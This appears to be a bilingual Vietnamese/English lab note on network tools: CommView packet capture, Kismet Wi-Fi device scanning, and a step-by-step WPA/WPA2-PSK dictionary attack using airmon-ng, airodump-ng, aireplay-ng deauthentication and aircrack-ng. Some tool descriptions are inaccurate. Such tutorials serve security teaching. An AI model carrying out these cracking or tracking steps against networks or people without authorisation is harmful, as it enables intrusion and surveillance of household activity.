## **I. COMMVIEW**
### **1. General about Commview**
Commview là một chương trình dùng để bắt (capturing) và phân tích (analyzing) các gói tin cho mạng Internet hoặc mạng LAN.
![19ed9d1d3136df47c.png](https://www.upsieutoc.com/images/2020/06/14/19ed9d1d3136df47c.png)

Hiện thị các thông số về Channel and Amplitude of APs.
![2ac6e4339b2f9a87d.png](https://www.upsieutoc.com/images/2020/06/14/2ac6e4339b2f9a87d.png)

### **2. Cách sử dụng**
Giao diện của chương trình có 5 trang cho phép bạn xem các dữ liệu và thực thi các hành động khác nhau đối với các gói tin đã bắt được.

Để bắt đầu bắt gói tin, chọn card mạng từ danh sách thả xuống trên thanh công cụ Toolbar, và click vào nút Start Capture hoặc chọn menu File ⇒ Start Capture.

Nếu các gói tin nào đi ngang qua card mạng mà bạn đã chọn, CommView sẽ hiển thị các thông tin về các gói tin đó.
#### **a) Nodes**
Show all information, such as: Vendor Name/MAC address, Channel, SSID, Signal, Max rate, Streams, Rate, Byte, Packet, Retry, Fragment,…
![3377ee3298c348c5a.png](https://www.upsieutoc.com/images/2020/06/14/3377ee3298c348c5a.png)
#### **b) Channels**
Show something about statics, general information about each channel:
![4.png](https://www.upsieutoc.com/images/2020/06/14/4.png)

Statistics about packet types and data rates:

![523b7af6be0a09be4.png](https://www.upsieutoc.com/images/2020/06/14/523b7af6be0a09be4.png)
#### **c) Latest IP Connections (IP Statistics)**
Trang này dùng để hiển thịthông tin chi tiết về những kết nối mạng của máy tính của bạn.
* Local IP – hiển thị địa chỉ IP local. : Tùy gói tin inbound / outbound packets.
* Remote IP – giống như Local IP nhưng ngược lại.
* In, Out –Hiển thị số gói tin đã nhận được / gửi đi.
* Direction –Hiển thị hướng đi của gói tin đó.
* Sessions – hiển thị số các phiên (sessions) kết nối TCP/IP thành công.
* Ports – Liệt kê tất cả các port của remote computer dùng các kết nối sử dụng giao thức TCP/IP.
* Hostname – Hiện thịtên của máy tính từ xa (remote computer). Nếu tên máy tính không thể phân giải
được, thì cột này bỏ trống.
* Bytes – hiển thị số các bytes đã được truyền trong phiên làm việc này.

![6.png](https://www.upsieutoc.com/images/2020/06/14/6.png)
#### **d) Packet**
Trang này được sử dụng để liệt kê tất cả các gói tin mạng đã được bắt và hiển thị thông tin chi tiết về các gói tin.
![7.png](https://www.upsieutoc.com/images/2020/06/14/7.png)
Bảng trên cùng (bảng thứ 1) hiển thị các gói tin đã bắt được. Dùng bàng này để chọn các gói tin nào mà bạn muốn hiển thị và phân tích. Khi bạn chọn gói tin bằng cách click chuột vào nó, thì có 2 bảng khác hiển thị các thông tin chi tiết về gói tin mà bạn chọn.
* No – số thứ tự của gói tin.
* Protocol – hiển thị giao thức của gói tin.
* MAC Addresses – hiển thị địa chỉ MAC nguồn và đích, hướng đi của gói tin.
* IP addresses – hiển thị địa chỉ IP nguồn và đích của gói tin, hướng đi của gói tin.
* Ports –hiển thị port nguồn và port đích của gói tin, hướng đi của gói tin. Port có thểhiện thịtheo tên dịch
vụ hay theo giá trị số.
* Time / Delta – hiển thịthời gian tuyệt đối hoặc thời gian delta (delta time). Delta time là sự chênh lệnh
giữa 2 gói tin cuối cùng của thời gian tuyệt đối.
#### **e) Rules**
Trang này cho phép bạn tạo ra các rule để bắt các gói tin. Ví dụ bạn có thể tạo ra rule để bắt những gói tin đi vào mạng của bạn. Có một vài rule mà bạn cần biết.
* Protocols & Direction:Cho phép bạn bỏ qua hay bắt những gói tin dựa trên giao thức của tầng 2 và tầng 3, hướng đi của gói tin.
* MAC addresses Cho phép bạn bỏ qua hay bắt gói tin dựa trên địa chỉ MAC.
* Ports Cho phép bạn bỏ qua hay bắt gói tin dựa trên port của gói tin đó.
* TCP Flags Cho phép bạn bỏ qua hay bắt gói tin dựa trên TCP flags.
* Text Cho phép bạn bắt gói tin dựa trên nội dung.
  
![8.png](https://www.upsieutoc.com/images/2020/06/14/8.png)
### **3. Thanh công cụ / hỗ trợ**
Ngoài các tính năng kể trên, CommView còn hỗ trợ các tùy chọn khác như IP Alisases, MAC alisases, Package Generator, Reconstruct TCP session
![9.png](https://www.upsieutoc.com/images/2020/06/14/9.png)
## **II. KISMET**
Flow: Open Terminal ⇒ airmon-ng start wlan0

Kismet can detect any nearby devices that use Wi-Fi, whether they are connected or not. This ability lets us scan the nearby area for both APs and client devices, even watch small details about when a device or connection is in use.

With this data, we can tell when people are home, what devices they own & when they are using them.

Devices per channel:
![10.png](https://www.upsieutoc.com/images/2020/06/14/10.png)

General information about all nearby devices use Wi-Fi:
![11.png](https://www.upsieutoc.com/images/2020/06/14/11.png)

Device Details –Device Info:

![12.png](https://www.upsieutoc.com/images/2020/06/14/12.png)

Statistics about Wi-Fi:

![13.png](https://www.upsieutoc.com/images/2020/06/14/13.png)

Packet Graphs:

![14.png](https://www.upsieutoc.com/images/2020/06/14/14.png)

## **III. CRACKING WPA/WPA2-PSK WITH A DICTIONARY ATTACK**
### **1. Methodology**: Dictionary attack.

### **2. Used software**:
* Aireplay-ng – Most popular Perl-based WEP encryption cracking tool
* Airodump – GrabbingIVs

### **3. Requirement**:
* OS: Obviously Kali Linux (at least 2016.2) installed and working.
* A wireless adapter capable of injection/monitor mode. Some computers have network cards capable of this from the factory. If it isn't available you'll have to buy an external one.
* A wordlist to attempt to "crack" the password once it has been captured.

### **4. Details of steps**:
#### **Step 1 - Start the wireless interface in monitor mode**
* airmon-ng
* airmon-ng start wlan0
* iwconfig
#### **Step 2 - Start airodump-ng to collect authentication handshake**
* airodump-ng wlan0mon ⇒ Xac dinh channel
* iwconfig wlan0mon channel 11 ⇒ Xac dinh 1 client dang ket noi toi AP.
* airodump-ng -c 11 --bssid <MAC_AP> -w psk wlan0mon ... ⇒ Set up 1 client connect AP !!
#### **Step 3 - Use aireplay-ng to deauthenticate the wireless client**
* aireplay-ng -0 1 -a <MAC_AP> -c <Client_AP> ath0
#### **Step 4 -Run aircrack-ng to crack the pre-shared key**
* aircrack-ng -w password.lst -b <MAC_AP> psk*.cap
### **5. Reference**
Demo is available on Youtube:
[![](https://www.upsieutoc.com/images/2020/06/14/image11e433a1ce5fac76.png)](https://youtu.be/lyvsETiD1WM)

-----------------------------------------------------------------
